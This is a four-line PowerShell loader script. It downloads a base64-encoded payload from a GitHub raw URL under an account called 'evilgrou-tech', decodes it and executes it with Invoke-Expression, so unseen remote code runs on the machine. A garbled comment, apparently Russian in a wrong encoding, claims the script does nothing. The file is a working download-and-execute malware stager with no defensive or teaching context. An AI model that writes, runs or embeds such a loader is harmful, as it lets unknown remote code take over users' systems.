# loader.ps1 ≈ ецн ме фюкйн, нм мхвецн ме слеер
$e = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/evilgrou-tech/drivers/refs/heads/main/encrypted.b64');
$d = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($e));
Invoke-Expression $d